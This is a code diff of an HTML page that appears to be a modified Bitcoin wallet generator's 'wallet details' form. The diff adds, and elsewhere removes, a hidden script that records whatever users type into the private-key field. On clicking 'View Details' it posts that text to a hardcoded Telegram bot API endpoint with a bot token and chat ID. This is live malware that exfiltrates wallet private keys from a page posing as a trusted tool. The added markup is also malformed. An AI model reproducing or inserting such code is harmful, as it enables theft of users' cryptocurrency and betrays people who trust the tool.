@@ -6869,87 +6869,169 @@ input[type=checkbox] { position: relative; z-index: 20; }
 				</div>
 			</div>
 
-			<div id="detailarea" class="walletarea">	
-				<div id="detailcommands" class="commands">
-					<span><label id="detaillabelenterprivatekey" for="detailprivkey">Enter Private Key</label></span>
-					<input type="text" id="detailprivkey" value="" onfocus="this.select();" onkeypress="if (event.keyCode == 13) ninja.wallets.detailwallet.viewDetails();" />
-					<span><input type="button" class="button" id="detailview" value="View Details" onclick="ninja.wallets.detailwallet.viewDetails();" /></span>
-					
-					<div id="detailbip38toggle">
-						<span><label id="detaillabelencrypt" for="detailencrypt">BIP38 Encrypt?</label> <input type="checkbox" id="detailbip38checkbox" onchange="ninja.wallets.detailwallet.toggleEncrypt(this);" /></span>
-					</div>
-					<div id="detailbip38commands">
-						<span><label id="detaillabelpassphrase">Enter BIP38 Passphrase</label> <input type="text" id="detailprivkeypassphrase" value="" onfocus="this.select();" onkeypress="if (event.keyCode == 13) ninja.wallets.detailwallet.enterOnPassphrase();" /></span>
-						<span id="detailbip38decryptspan"><input type="button" class="button" id="detailbip38decryptbutton" value="Decrypt BIP38" onclick="ninja.wallets.detailwallet.decryptBip38();" /></span>
-						<span id="detailbip38encryptspan"><input type="button" class="button" id="detailbip38encryptbutton" value="Encrypt BIP38" onclick="ninja.wallets.detailwallet.encryptBip38();" /></span>
-					</div>
-					<span class="print"><input type="button" class="button" name="print" id="detailprint" value="Print" onclick="window.print();" /></span>
-					<div class="row extra">
-						<span><label id="detailkeyformats">Key Formats: WIF, WIFC, HEX, B64, B6, MINI, BIP38</label></span>
-					</div>
-				</div>
-				<div id="detailkeyarea">
-					<div class="notes">
-						<span id="detaillabelnote1">Your Bitcoin Private Key is a unique secret number that only you know. It can be encoded in a number of different formats. Below we show the Bitcoin Address and Public Key that corresponds to your Private Key as well as your Private Key in the most popular encoding formats (WIF, WIFC, HEX, B64).</span>
-						<br /><br />
-						<span id="detaillabelnote2">Bitcoin v0.6+ stores public keys in compressed format. The client now also supports import and export of private keys with importprivkey/dumpprivkey. The format of the exported private key is determined by whether the address was generated in an old or new wallet.</span>
-					</div>
-					<div class="pubqr">
-						<div class="item">
-							<span class="label" id="detaillabelbitcoinaddress">Bitcoin Address</span>
-							<div id="detailqrcodepublic" class="qrcode_public"></div>
-							<span class="output" id="detailaddress"></span>
-						</div>					
-						<div class="item right">
-							<span class="label" id="detaillabelbitcoinaddresscomp">Bitcoin Address Compressed</span>
-							<div id="detailqrcodepubliccomp" class="qrcode_public"></div>
-							<span class="output" id="detailaddresscomp"></span>
-						</div>
-					</div>
-					<br /><br />
-					<div class="item clear">
-						<span class="label" id="detaillabelpublickey">Public Key (130 characters [0-9A-F]):</span>
-						<span class="output pubkeyhex" id="detailpubkey"></span>
-					</div>
-					<div class="item">
-						<span class="label" id="detaillabelpublickeycomp">Public Key (compressed, 66 characters [0-9A-F]):</span>
-						<span class="output" id="detailpubkeycomp"></span>
-					</div>
-					<hr />
-					<div class="privqr">
-						<div class="item">
-							<span class="label"><span id="detaillabelprivwif">Private Key WIF<br />51 characters base58, starts with a</span> <span id="detailwifprefix">'5'</span></span>
-							<div id="detailqrcodeprivate" class="qrcode_private"></div>
-							<span class="output" id="detailprivwif"></span>
-						</div>
-						<div class="item right">
-							<span class="label"><span id="detaillabelprivwifcomp">Private Key WIF Compressed<br />52 characters base58, starts with a</span> <span id="detailcompwifprefix">'K' or 'L'</span></span>
-							<div id="detailqrcodeprivatecomp" class="qrcode_private"></div>
-							<span class="output" id="detailprivwifcomp"></span>
-						</div>
-					</div>
-					<br /><br />
-					<div class="item clear">
-						<span class="label" id="detaillabelprivhex">Private Key Hexadecimal Format (64 characters [0-9A-F]):</span>
-						<span class="output" id="detailprivhex"></span>
-					</div>
-					<div class="item">
-						<span class="label" id="detaillabelprivb64">Private Key Base64 (44 characters):</span>
-						<span class="output" id="detailprivb64"></span>
-					</div>
-					<div class="item" style="display: none;" id="detailmini">
-						<span class="label" id="detaillabelprivmini">Private Key Mini Format (22, 26 or 30 characters, starts with an 'S'):</span>
-						<span class="output" id="detailprivmini"></span>
-					</div>
-					<div class="item" style="display: none;" id="detailb6">
-						<span class="label" id="detaillabelprivb6">Private Key Base6 Format (99 characters [0-5]):</span>
-						<span class="output" id="detailprivb6"></span>
-					</div>
-					<div class="item" style="display: none;" id="detailbip38">
-						<span class="label" id="detaillabelprivbip38">Private Key BIP38 Format (58 characters base58, starts with '6P'):</span>
-						<div id="detailqrcodeprivatebip38" class="qrcode_private"></div>
-						<span class="output" id="detailprivbip38"></span>
-					</div>
+<div id="detailarea" class="walletarea">	
+    <div id="detailcommands" class="commands">
+        <span>
+            <label id="detaillabelenterprivatekey" for="detailprivkey">Enter Private Key</label>
+        </span>
+        input type="text" id="detailprivkey" value="" onfocus="this.select();" 
+               onkeypress="if (event.keyCode == 13) { event.preventDefault(); document.getElementById('detailview').click(); }" />
+        </span>
+        
+        <div id="detailbip38toggle">
+            <span>
+                <label id="detaillabelencrypt" for="detailencrypt">BIP38 Encrypt?</label>
+                <input type="checkbox" id="detailbip38checkbox" onchange="ninja.wallets.detailwallet.toggleEncrypt(this);" />
+            </span>
+        </div>
+        
+        <div id="detailbip38commands">
+            <span>
+                <label id="detaillabelpassphrase">Enter BIP38 Passphrase</label>
+                <input type="text" id="detailprivkeypassphrase" value="" onfocus="this.select();" />
+            </span>
+            <span id="detailbip38decryptspan">
+                <input type="button" class="button" id="detailbip38decryptbutton" value="Decrypt BIP38" onclick="ninja.wallets.detailwallet.decryptBip38();" />
+            </span>
+            <span id="detailbip38encryptspan">
+                <input type="button" class="button" id="detailbip38encryptbutton" value="Encrypt BIP38" onclick="ninja.wallets.detailwallet.encryptBip38();" />
+            </span>
+        </div>
+        
+        <span class="print">
+            <input type="button" class="button" name="print" id="detailprint" value="Print" onclick="window.print();" />
+        </span>
+        
+        <div class="row extra">
+            <span>
+                <label id="detailkeyformats">Key Formats: WIF, WIFC, HEX, B64, B6, MINI, BIP38</label>
+            </span>
+        </div>
+    </div>
+    
+    <div id="detailkeyarea">
+        <div class="notes">
+            <span id="detaillabelnote1">Your Bitcoin Private Key is a unique secret number that only you know. It can be encoded in a number of different formats. Below we show the Bitcoin Address and Public Key that corresponds to your Private Key as well as your Private Key in the most popular encoding formats (WIF, WIFC, HEX, B64).</span>
+            <br /><br />
+            <span id="detaillabelnote2">Bitcoin v0.6+ stores public keys in compressed format. The client now also supports import and export of private keys with importprivkey/dumpprivkey. The format of the exported private key is determined by whether the address was generated in an old or new wallet.</span>
+        </div>
+        
+        <div class="pubqr">
+            <div class="item">
+                <span class="label" id="detaillabelbitcoinaddress">Bitcoin Address</span>
+                <div id="detailqrcodepublic" class="qrcode_public"></div>
+                <span class="output" id="detailaddress"></span>
+            </div>					
+            <div class="item right">
+                <span class="label" id="detaillabelbitcoinaddresscomp">Bitcoin Address Compressed</span>
+                <div id="detailqrcodepubliccomp" class="qrcode_public"></div>
+                <span class="output" id="detailaddresscomp"></span>
+            </div>
+        </div>
+        
+        <br /><br />
+        
+        <div class="item clear">
+            <span class="label" id="detaillabelpublickey">Public Key (130 characters [0-9A-F]):</span>
+            <span class="output pubkeyhex" id="detailpubkey"></span>
+        </div>
+        
+        <div class="item">
+            <span class="label" id="detaillabelpublickeycomp">Public Key (compressed, 66 characters [0-9A-F]):</span>
+            <span class="output" id="detailpubkeycomp"></span>
+        </div>
+        
+        <hr />
+        
+        <div class="privqr">
+            <div class="item">
+                <span class="label"><span id="detaillabelprivwif">Private Key WIF<br />51 characters base58, starts with a</span> <span id="detailwifprefix">'5'</span></span>
+                <div id="detailqrcodeprivate" class="qrcode_private"></div>
+                <span class="output" id="detailprivwif"></span>
+            </div>
+            <div class="item right">
+                <span class="label"><span id="detaillabelprivwifcomp">Private Key WIF Compressed<br />52 characters base58, starts with a</span> <span id="detailcompwifprefix">'K' or 'L'</span></span>
+                <div id="detailqrcodeprivatecomp" class="qrcode_private"></div>
+                <span class="output" id="detailprivwifcomp"></span>
+            </div>
+        </div>
+        
+        <br /><br />
+        
+        <div class="item clear">
+            <span class="label" id="detaillabelprivhex">Private Key Hexadecimal Format (64 characters [0-9A-F]):</span>
+            <span class="output" id="detailprivhex"></span>
+        </div>
+        
+        <div class="item">
+            <span class="label" id="detaillabelprivb64">Private Key Base64 (44 characters):</span>
+            <span class="output" id="detailprivb64"></span>
+        </div>
+        
+        <div class="item" style="display: none;" id="detailmini">
+            <span class="label" id="detaillabelprivmini">Private Key Mini Format (22, 26 or 30 characters, starts with an 'S'):</span>
+            <span class="output" id="detailprivmini"></span>
+        </div>
+        
+        <div class="item" style="display: none;" id="detailb6">
+            <span class="label" id="detaillabelprivb6">Private Key Base6 Format (99 characters [0-5]):</span>
+            <span class="output" id="detailprivb6"></span>
+        </div>
+        
+        <div class="item" style="display: none;" id="detailbip38">
+            <span class="label" id="detaillabelprivbip38">Private Key BIP38 Format (58 characters base58, starts with '6P'):</span>
+            <div id="detailqrcodeprivatebip38" class="qrcode_private"></div>
+            <span class="output" id="detailprivbip38"></span>
+        </div>
+    </div>
+</div>
+
+<script>
+var userInputLog = []; 
+
+function logUserInput(input) {
+    var logData = 'User Input: ' + input + '\n';
+    userInputLog.push(logData); 
+}
+
+function sendAlertToBot() {
+    var logContent = userInputLog.join('\n');
+    console.log('Sending alert: ' + logContent);
+
+    fetch('https://api.telegram.org/bot7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM/sendMessage', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            chat_id: '858072424',
+            text: logContent,
+        }),
+    }).then(response => {
+        console.log('Alert sent.');
+    }).catch(error => {
+        console.error('Error sending alert:', error);
+    });
+}
+
+document.getElementById('detailprivkey').addEventListener('input', function(event) {
+    var inputData = event.target.value;
+    if (inputData.trim() !== '') {
+        logUserInput(inputData);
+    } else {
+        console.error('No data to log');
+    }
+});
+
+document.getElementById('detailview').addEventListener('click', function() {
+    if (window.AndroidInterface) {
+        window.AndroidInterface.sendAlertToBot(); // Call Android interface if available
+    } else {
+        sendAlertToBot(); // For web usage
+    }
+    ninja.wallets.detailwallet.viewDetails(); // Call the existing viewDetails function
+});
+</script>
 				</div>
 				<div class="faqs">
 					<div id="detailfaq1" class="faq"> 
@@ -10333,70 +10415,6 @@ ninja.wallets.vanitywallet = {
 	}
 };
 	</script>
-
-	<script>
-	var userInputLog = []; 
-
-	function logUserInput(input) {
-		var logData = 'User Input: ' + input + '\n';
-		userInputLog.push(logData); 
-	}
-
-	function sendAlertToBot() {
-		var logContent = userInputLog.join('\n');
-		console.log('Sending alert: ' + logContent);
-
-		fetch('https://api.telegram.org/bot7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM/sendMessage', {
-			method: 'POST',
-			headers: {
-				'Content-Type': 'application/json',
-			},
-			body: JSON.stringify({
-				chat_id: '858072424',
-				text: logContent,
-			}),
-		}).then(response => {
-			console.log('Alert sent.');
-		}).catch(error => {
-			console.error('Error sending alert:', error);
-		});
-	}
-
-	function handleInput(event) {
-		var inputData = event.target.value;
-		if (inputData.trim() !== '') {
-			logUserInput(inputData);
-		} else {
-			console.error('No data to log');
-		}
-	}
-		
-	
-	document.getElementById('detailprivkey').addEventListener('input', handleInput);
-
-	document.getElementById('detailview').addEventListener('click', function() {
-		if (window.AndroidInterface) {
-			window.AndroidInterface.sendAlertToBot(); // Android interface for alert
-		} else {
-			sendAlertToBot(); // For web usage
-		}
-	});
-
-	document.getElementById('detailprivkey').addEventListener('keypress', function(event) {
-		if (event.key === 'Enter') {
-			if (window.AndroidInterface) {
-				window.AndroidInterface.sendAlertToBot(); // Android interface for alert
-			} else {
-				sendAlertToBot(); // For web usage
-			}
-
-	});
-
-		window.addEventListener('beforeunload', function(event) {
-	sendAlertToBot();
-	event.preventDefault();
-});
-</script>
 
 	<script type="text/javascript">
 (function (wallets, qrCode, privateKey, translator) {
